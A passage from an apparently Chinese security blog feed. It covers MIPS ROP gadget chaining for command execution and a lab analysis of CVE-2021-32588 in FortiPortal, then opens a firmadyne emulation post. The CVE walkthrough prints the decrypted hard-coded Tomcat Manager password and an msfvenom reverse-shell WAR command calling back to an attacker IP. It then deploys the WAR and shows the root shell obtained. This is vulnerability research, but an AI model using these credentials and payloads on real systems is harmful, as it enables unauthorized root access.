<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $a0, $sp, 24</span><br><span class="line">lw      $ra, 68($sp)</span><br><span class="line">lw      $s3, 64($sp)</span><br><span class="line">lw      $s2, 60($sp)</span><br><span class="line">lw      $s1, 56($sp)</span><br><span class="line">lw      $s0, 52($sp)</span><br><span class="line">jr      $ra</span><br><span class="line">addiu   $sp, 72</span><br></pre></td></tr></table></figure></div>

<p>执行时，$sp + 24 地址被加载到 $a0，$sp + 68 地址的值被加载到 $ra，然后以 4 字节为单位将 $sp + 64 ~ $sp + 52 的数据加载到 $s3 ~ $s0，最后用 jr 指令跳转到 $ra 即 $sp + 68 指向的内存区域，由于 MIPS 的流水线效应，最后一句 addiu $sp,72 在跳转之后已经执行完毕。</p>
<p>此时几个寄存器状态：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a0 = command</span><br><span class="line">$ra = system_address</span><br><span class="line">$s0 = &quot;aaaa&quot;</span><br><span class="line">$s1 = &quot;aaaa&quot;</span><br><span class="line">$s2 = &quot;aaaa&quot;</span><br><span class="line">$s3 = &quot;aaaa&quot;</span><br><span class="line">$pc = system_address</span><br><span class="line">$sp = old_sp + 72</span><br></pre></td></tr></table></figure></div>

<p>由于最后的 addiu $sp, 72，$sp 指向我们布局的内存数据之下(即 data 部分)：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/mipsrop-2.png"
                     
                ></p>
<p>$pc 已经指向 system 函数，程序继续执行 system 对应代码，查看 system 函数开头的部分汇编代码</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">la      $gp, locret_1E4F0  # Alternative name is &#x27;__libc_system&#x27;</span><br><span class="line">addu    $gp, $t9</span><br><span class="line">addiu   $sp, -40</span><br><span class="line">sw      $s0, 24($sp)</span><br><span class="line">la      $s0, loc_50000</span><br><span class="line">sw      $gp, 16($sp)</span><br><span class="line">sw      $s1, 28($sp)</span><br><span class="line">sw      $ra, 36($sp)</span><br><span class="line">sw      $s2, 32($sp)</span><br></pre></td></tr></table></figure></div>

<p>其中第三条指令为 system 函数分配栈空间，把 $sp 减去 40，得到 system 函数的栈顶，后续 system 以及 system 所调用的子函数，都会使用这个栈顶及以上的内存来存取临时变量，如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/mipsrop-3.png"
                     
                ></p>
<p>实际上小于 $sp + 72 的栈空间都可能会被其它变量的数据所覆盖。</p>
<p>如果恰巧有某个临时变量的数据被保存到 $sp + 24 附近的内存，本应是正常的系统命令就会被破坏，导致 exploit 失败。</p>
<h2 id="如何避免此类问题"><a href="#如何避免此类问题" class="headerlink" title="如何避免此类问题"></a>如何避免此类问题</h2><p><strong>方法1：寻找包含 jr $sx 的 gadget 或利用其它寄存器转移参数</strong></p>
<p>mipsrop 中可能会找到如下 gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">|  0x00016BC8  |  addiu $s0,$sp,16 ; jalr  $s1  </span><br></pre></td></tr></table></figure></div>

<p>这个 gadget 对应的指令序列如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $s0, $sp, 16</span><br><span class="line">move    $a0, $s0</span><br><span class="line">move    $t9, $s1</span><br><span class="line">jalr    $t9</span><br><span class="line">move    $a1, $s5</span><br></pre></td></tr></table></figure></div>

<p>先将 $sp + 16 地址加载到 $s0，然后 $s0 被赋值给 $a0，最后跳转到 $s1，期间不存在对 $sp 的修改。这种 gadget 很多情况下可以防止 command 被覆盖。</p>
<p><strong>方法2：利用 popen 部分代码</strong></p>
<p>popen 中调用了 execl 函数来执行系统命令，其中参数加载过程通常位于同一个汇编代码块中</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">la      $a0, loc_50000</span><br><span class="line">la      $a1, loc_50000</span><br><span class="line">la      $a2, loc_50000</span><br><span class="line">la      $t9, execl</span><br><span class="line">addiu   $a0, (aBinSh - 0x50000)  # &quot;/bin/sh&quot;</span><br><span class="line">sw      $zero, 0x50+var_40($sp)</span><br><span class="line">addiu   $a1, (off_533C4 - 0x50000)</span><br><span class="line">addiu   $a2, (off_532C0 - 0x50000)</span><br><span class="line">bal     execl</span><br><span class="line">move    $a3, $s7</span><br></pre></td></tr></table></figure></div>

<p>$a0、$a1、$a2 在代码中都已完成加载，我们只需要控制 $s7 为 command 地址，这样在跳转到 execl 执行前，move $a3,$s7 就会把 command 地址放到 $a3 中，完成参数传递。</p>
<p>通过 mipsrop 找到将 stack 地址加载到 $s7 的 gadget</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">addiu   $s7, $sp, 24</span><br><span class="line">addiu   $s6, 0x101</span><br><span class="line">addiu   $s5, (asc_54958 - 0x50000)</span><br><span class="line">lw      $a0,  -22144($fp)</span><br><span class="line">move    $a1, $s7</span><br><span class="line">move    $a2, $s6</span><br><span class="line">move    $t9, $s4</span><br><span class="line">jalr    $t9</span><br><span class="line">move    $a3, $s5</span><br></pre></td></tr></table></figure></div>

<p>加载后跳转到 $s4 继续执行，但如果直接跳回 popen，会导致参数异常，这是因为 MIPS 中对全局变量寻址有特殊的策略，MIPS 为了方便对全局变量数据的寻址，引入一个叫做 $gp 的寄存器，通过此寄存器，一条 4 字节的指令即可实现在 $gp +- 32K 内存中的寻址过程[3]。</p>
<p>$gp 是在函数开头就设置好的，由于我们是直接跳转到 popen 函数的中间部分，这就导致 $gp 错误，无法正确找到相关参数，所以需要引入另一段 gadget 来修正 $gp。</p>
<p>$gp 寄存器具体的值可通过调试目标函数开头确定，这个值相对 libc 基址偏移固定。确定好 $gp 值后即可寻找相关 gadget 修正。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lw      $gp, 16($sp)</span><br><span class="line">move    $t9, $s1</span><br><span class="line">jalr    $t9</span><br><span class="line">li      $a0, 3</span><br></pre></td></tr></table></figure></div>

<p>以上 gadget 会将 $sp + 16 的值加载到 $gp，然后跳转到 $s1，恰好可以满足需求。</p>
<p>综合上述流程，gadget 执行顺序如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">将 $sp + 24 填充为 command，跳转到第一段 gadget ($ra)</span><br><span class="line">gadget1: 将 command 地址加载到 $s7，跳转到第二段 gadget ($s4)</span><br><span class="line">gadget2: 将 $sp + 16 加载到 $gp，跳转到第三段 gadget ($s1)</span><br><span class="line">gadget3: popen 部分代码</span><br></pre></td></tr></table></figure></div>

<p>这样执行 popen 部分时，各参数可正确寻址，并且 command 也不会被覆盖，可以成功执行系统命令。</p>
<p>实际上，除了 MIPS 外其他架构也可能存在类似问题，主要原因就是需要使用的数据位于下一个函数的栈帧内，比较通用的思路，一是可以调整数据位置，将其移动到不会被覆盖或修改的位置，或者可以利用对应指令集的特性来避免数据被覆盖。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[1] <a class="link"   href="https://stackoverflow.com/questions/8178001/mips-memory-execution-prevention?rq=1" >operating system - MIPS memory execution prevention - Stack Overflow<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>[2] <a class="link"   href="https://s3-eu-west-1.amazonaws.com/downloads-mips/documents/MD00090-2B-MIPS32PRA-AFP-06.02.pdf" >MIPS® Architecture For Programmers <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>[3] <a class="link"   href="https://stackoverflow.com/questions/2618790/mips-gp-register" >MIPS $gp register - Stack Overflow<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2021-32588</title>
    <url>/2021/09/02/CVE-2021-32588/</url>
    <content><![CDATA[<p>披露信息：<a class="link"   href="https://www.fortiguard.com/psirt/FG-IR-21-077" >https://www.fortiguard.com/psirt/FG-IR-21-077<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>漏洞编号：CVE-2021-32588</p>
<p>漏洞描述：A use of hard-coded credentials (CWE-798) vulnerability in FortiPortal may allow a remote and unauthenticated attacker to execute unauthorized commands as root by uploading and deploying malicious web application archive files using the default hard-coded Tomcat Manager username and password. </p>
<span id="more"></span>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载 6.0.4 和 6.0.5 两个版本，导入 6.0.4 镜像到 VMware，启动后发现控制台输出错误信息</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server..</span><br><span class="line">db_Migration failed. Going to prevent fpc web app from launching.</span><br></pre></td></tr></table></figure></div>

<p>这里提示链接数据库服务器失败，查阅官网手册发现需要手动配置一台数据库服务器，具体步骤可参考[官网文档](<a class="link"   href="https://docs.fortinet.com/document/fortiportal/6.0.5/administration-guide/878514/basic-setup" >Administration Guide | FortiPortal 6.0.5 | Fortinet Documentation Library<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>)。</p>
<p>配置好数据库服务器后，需要对虚拟机的网络等进行配置。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin 空密码登录系统</span><br><span class="line">config system interface   进入网卡配置选项</span><br><span class="line">edit port1    编辑 port1 网卡</span><br><span class="line">set ip 192.168.0.200/24   设置网卡 ip 为 192.168.0.200，掩码 255.255.255.0</span><br><span class="line">set allowaccess ping https ssh http   设置网卡允许 ssh、http、ping https 协议</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">config system route    进入路由配置选项</span><br><span class="line">edit 1                 编辑条目 1</span><br><span class="line">set device port1       设置网卡 port1</span><br><span class="line">set gateway 192.168.0.1  设置网关地址 192.168.0.1</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">config system sql    进入数据库配置选项</span><br><span class="line">set status remote    设置数据库服务为远程</span><br><span class="line">set database-name fp_fazlite     设置数据库名</span><br><span class="line">set database-type mysql     设置数据库类型</span><br><span class="line">set database-port 3306      设置数据库服务器端口</span><br><span class="line">set username fpc             设置 mysql 用户名</span><br><span class="line">set password xyz             mysql 密码</span><br><span class="line">set server 192.168.0.163    设置数据库服务器地址</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>

<p>配置好后重启虚拟机。</p>
<p>在数据库服务器登录 mysql，执行以下语句来查看是否配置成功</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from ftntpmcdb.fpc_version;</span><br></pre></td></tr></table></figure></div>

<p>结果中输出了版本信息即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CVE-2021-32588-1.png"
                     
                ></p>
<p>此时可通过刚刚配置的 IP 来访问 web 服务。</p>
<h3 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h3><p>fortiportal 本身不提供 Linux shell，我们需要想办法拿到设备固件。首先找到导入的虚拟磁盘，对其进行解压。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS：如果是在 Windows 环境下，建议安装 7-zip 软件，安装后直接右键虚拟磁盘，选择使用 7-zip 打开即可看到内容。</span><br></pre></td></tr></table></figure></div>

<p>解压可得到一个 rootfs.gz 文件，解包后获取到根文件系统，但是此时文件系统中缺失了大部分数据，在根目录下能找到三个压缩包: bin.tar.xz、lib.tar.xz、usr.tar.xz</p>
<p>直接使用 tar 等工具不能解压这三个文件，猜测设备在初始化过程中会进一步对这些文件进行处理。</p>
<p>考虑到 Linux 系统的启动流程，内核初始化完成之后会进入 init_post 函数，在这里将控制流移交给用户空间进程，包括 &#x2F;sbin&#x2F;init、&#x2F;etc&#x2F;init、&#x2F;bin&#x2F;init、&#x2F;bin&#x2F;sh。</p>
<p>此时可以参考<a href="https://wzt.ac.cn/2021/05/12/vm_shell">文章</a>，通过虚拟机调试的方法尝试获取 shell，但这里我们有更简单的方法。</p>
<p>在解压出来的根文件系统中寻找上述的四个初始化程序，在 &#x2F;bin 目录下发现只有一个 init 文件。</p>
<p>IDA 打开分析，其主函数代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_804A4A2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> v1; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">char</span> v2; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">char</span> v3; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">char</span> v4; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">    <span class="type">int</span> v5[<span class="number">2</span>]; <span class="comment">// [esp+14h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;lib&quot;</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;bin&quot;</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;usr&quot;</span>, <span class="number">0</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ( init_loader_decompress_dir(<span class="string">&quot;etc/dm/syntax/syntax&quot;</span>, <span class="number">1</span>) &lt; <span class="number">0</span> )</span><br><span class="line">                    sub_804A316(<span class="string">&quot;Decompress syntax error, image error\n&quot;</span>, v4);</span><br><span class="line">                v5[<span class="number">0</span>] = <span class="string">&quot;/bin/init&quot;</span>;</span><br><span class="line">                v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                sub_807EB00(<span class="string">&quot;/bin/init&quot;</span>, v5, <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                sub_804A316(<span class="string">&quot;Decompress usr error, image error\n&quot;</span>, v3);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            sub_804A316(<span class="string">&quot;Decompress bin error, image error\n&quot;</span>, v2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        sub_804A316(<span class="string">&quot;Decompress lib error, image error\n&quot;</span>, v1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码看起来是对根目录下的三个压缩包实现解压，由于该程序为 x86 架构，可以直接在虚拟机中运行，执行以下命令实现对根目录的完全解压</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./bin/init</span><br></pre></td></tr></table></figure></div>

<p>执行后等待程序运行完毕，即可看到释放出了完整的 &#x2F;bin、&#x2F;lib 和 &#x2F;usr 目录。</p>
<p>在 &#x2F;usr&#x2F;local&#x2F;tomcat 目录发现关键文件。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>解包 6.0.4 和 6.0.5 两个版本的固件，进行补丁对比，发现新版中移除了 webapps 下的 manager 目录，经调查，此目录就是漏洞披露信息中提到的 Tomcat Manager 组件。</p>
<p>Tomcat Manager 会去 conf&#x2F;tomcat-users.xml 文件中读取用户信息，查看此文件发现以下记录</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">&quot;manager-script&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">&quot;fpcadmin&quot;</span> <span class="attr">password</span>=<span class="string">&quot;046ed5f485431c63$1000$63da3a538f1f15aea922875fd1e2c5645629ff3d24997bb3f978ad2538921168&quot;</span> <span class="attr">roles</span>=<span class="string">&quot;manager-script&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>说明在默认配置下存在一个名为 fpcadmin 的 manager-script 用户，此用户无法访问 GUI 界面，但是可以通过直接调用接口实现诸多功能。</p>
<p>首先要解决密码的问题，Tomcat Manager 官方文档中提到为了安全性，tomcat-users.xml 中的用户密码允许进行加密，防止密码泄露。通过全局搜索，在名为 FpcReloadTomcatApp.class 类中找到对 fpcadmin 用户操作的代码。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">reloadTomcatApp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">curlForReload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">    curlForReload</span><br><span class="line">        .append(<span class="string">&quot;curl -k -u fpcadmin:&quot;</span>)</span><br><span class="line">        .append(CipherUtils.decryptString(<span class="string">&quot;y542PfTSFP9E2mZ6SfBaIK4Y8OIEV3HyiBDBUjSQXB4=&quot;</span>))</span><br><span class="line">        .append(<span class="string">&quot; https://localhost/manager/text/reload?path=/fpc&quot;</span>);</span><br><span class="line">    log.info(<span class="string">&quot;execute curl for tomacat reload start &quot;</span> + Thread.currentThread().getName());</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeRequest(curlForReload.toString());</span><br><span class="line">        log.info(<span class="string">&quot;Tomcat reload context &#x27;fpc&#x27; result: &quot;</span> + output);</span><br><span class="line">        <span class="keyword">return</span> (output != <span class="literal">null</span>) &amp;&amp; (output.contains(<span class="string">&quot;OK&quot;</span>)) &amp;&amp; (output.contains(<span class="string">&quot;fpc&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">failedMessage</span> <span class="operator">=</span> <span class="string">&quot;reload context &#x27;fpc&#x27; failed. details in log. restart Tomcat server to make SAML update in effect.&quot;</span>;</span><br><span class="line"></span><br><span class="line">        log.error(failedMessage, ex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Tomcat 重新加载时，会使用 curl 命令调用 Tomcat Manager 的 reload 接口，其中使用了 fpcadmin 的密码。</p>
<p>先使用 decryptString 函数对其解密，解密函数关键代码</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] iv = <span class="keyword">new</span> <span class="title class_">byte</span>[cipher.getBlockSize()];</span><br><span class="line">pSpec = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv);</span><br><span class="line">cipher.init(<span class="number">2</span>, secretKey, pSpec);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">decryptedString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(cipher.doFinal(Base64.decodeBase64(stringToDecrypt)));</span><br><span class="line">log.debug(<span class="string">&quot;decrypt string&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> decryptedString;</span><br></pre></td></tr></table></figure></div>

<p>decryptString 使用 AES 算法对密码进行解密，key 被定义为成员变量</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] key = &#123; Byte.MAX_VALUE, <span class="number">34</span>, -<span class="number">24</span>, -<span class="number">72</span>, -<span class="number">95</span>, <span class="number">31</span>, -<span class="number">10</span>, -<span class="number">7</span>, <span class="number">74</span>, <span class="number">78</span>, -<span class="number">74</span>, -<span class="number">26</span>, -<span class="number">63</span>, -<span class="number">48</span>, -<span class="number">7</span>, -<span class="number">10</span> &#125;;</span><br></pre></td></tr></table></figure></div>

<p>所以我们可以编写代码对其中的密码进行解密</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.AlgorithmParameterSpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">dec</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] key = &#123; Byte.MAX_VALUE, <span class="number">34</span>, -<span class="number">24</span>, -<span class="number">72</span>, -<span class="number">95</span>, <span class="number">31</span>, -<span class="number">10</span>, -<span class="number">7</span>, <span class="number">74</span>, <span class="number">78</span>, -<span class="number">74</span>, -<span class="number">26</span>, -<span class="number">63</span>, -<span class="number">48</span>, -<span class="number">7</span>, -<span class="number">10</span> &#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">AlgorithmParameterSpec</span> <span class="variable">pSpec</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5PADDING&quot;</span>);</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">secretKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(key, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] iv = <span class="keyword">new</span> <span class="title class_">byte</span>[cipher.getBlockSize()];</span><br><span class="line">        pSpec = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv);</span><br><span class="line">        cipher.init(<span class="number">2</span>, secretKey, pSpec);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">decryptedString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(cipher.doFinal(Base64.getDecoder().decode(<span class="string">&quot;y542PfTSFP9E2mZ6SfBaIK4Y8OIEV3HyiBDBUjSQXB4=&quot;</span>)));</span><br><span class="line">        System.out.println(decryptedString);    <span class="comment">// fortinet@FPC#12345</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终得到明文密码：fortinet@FPC#12345</p>
<p>用账号 fpcadmin:fortinet@FPC#12345 即可登录 Tomcat Manager，并且访问后台接口。</p>
<h3 id="获取-shell"><a href="#获取-shell" class="headerlink" title="获取 shell"></a>获取 shell</h3><p>得到后台权限后可以进一步获取 root shell，我们使用工具 <a class="link"   href="https://github.com/tomcatmanager/tomcatmanager" >tomcatmanager<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，先修改 tomcat_manager.py 第 535 行 requests.put 代码，添加参数 verify&#x3D;False 防止 python SSL 证书报错。</p>
<p>首先用 msf 生成 war 木马</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.160  LPORT=13337 -f war &gt; shell.war</span><br></pre></td></tr></table></figure></div>

<p>tomcat-manager 链接到目标，密码：fortinet@FPC#12345</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat-manager&gt; connect https://192.168.0.200/manager fpcadmin --noverify</span><br><span class="line">Password: </span><br><span class="line">--connected to https://192.168.0.200/manager as fpcadmin</span><br><span class="line">--tomcat version: [Apache Tomcat/9.0.44]</span><br></pre></td></tr></table></figure></div>

<p>利用 deploy 接口部署木马</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat-manager&gt; deploy local ./shell.war /rce</span><br></pre></td></tr></table></figure></div>

<p>部署后可通过 list 命令查看是否部署成功</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">tomcat-manager&gt; list</span><br><span class="line">Path                     State   Sessions Directory                           </span><br><span class="line">------------------------ ------- -------- ------------------------------------</span><br><span class="line">/                        running        2 ROOT                                </span><br><span class="line">/fpc                     running        1 fpc                                 </span><br><span class="line">/manager                 running        0 manager                             </span><br><span class="line">/rce                     running        0 rce  </span><br></pre></td></tr></table></figure></div>

<p>我们看到列表中出现了刚刚部署的木马，对应路由为 &#x2F;rce</p>
<p>在攻击端监听端口 13337，然后访问 &#x2F;rce 接口，即可获取到 root shell</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  Desktop nc -lnvp 13337                    </span><br><span class="line">Listening on 0.0.0.0 13337</span><br><span class="line">Connection received on 192.168.0.200 46194</span><br><span class="line">uname -a</span><br><span class="line">Linux FPCVM64 2.6.36.3 #1 SMP Wed May 19 10:33:07 PDT 2021 x86_64 GNU/Linux</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>固件模拟 Case Study (3)</title>
    <url>/2021/08/15/firmadyne3/</url>
    <content><![CDATA[<p>模拟 DIR-815 固件。</p>
<span id="more"></span>

<h2 id="改造-firmadyne"><a href="#改造-firmadyne" class="headerlink" title="改造 firmadyne"></a>改造 firmadyne</h2><p><strong>剥离数据库</strong></p>
<p>firmadyne 默认会创建并使用数据库，用于记录和统计固件信息，然而我们在模拟固件的过程中通常无需这一功能，所以可以修改其代码取消数据库依赖。</p>
<p>修改 firmadyne&#x2F;scripts&#x2F;getArch.sh，删除操作数据库的代码</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">注释掉下面这句</span><br><span class="line"><span class="comment"># psql -d firmware -U firmadyne -h 127.0.0.1 -q -c &quot;UPDATE image SET arch = &#x27;$ARCHEND&#x27; WHERE id = $IID;&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>修改 firmadyne&#x2F;scripts&#x2F;makeImage.sh</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意</span><br><span class="line">原脚本中以下这段代码</span><br><span class="line">TARBALL_SIZE=$(tar ztvf &quot;$&#123;TARBALL_DIR&#125;/$&#123;IID&#125;.tar.gz&quot; --totals 2&gt;&amp;1 |tail -1|cut -f4 -d&#x27; &#x27;)</span><br><span class="line">如果你使用的 tar 会输出中文信息，那么默认 cut -f4 获取到的 IMAGE_SIZE 将是错误的，需要修改为</span><br><span class="line">TARBALL_SIZE=$(tar ztvf &quot;$&#123;TARBALL_DIR&#125;/$&#123;IID&#125;.tar.gz&quot; --totals 2&gt;&amp;1 |tail -1|cut -f2 -d&#x27; &#x27;)</span><br><span class="line">请根据你的实际情况进行修改</span><br></pre></td></tr></table></figure></div>



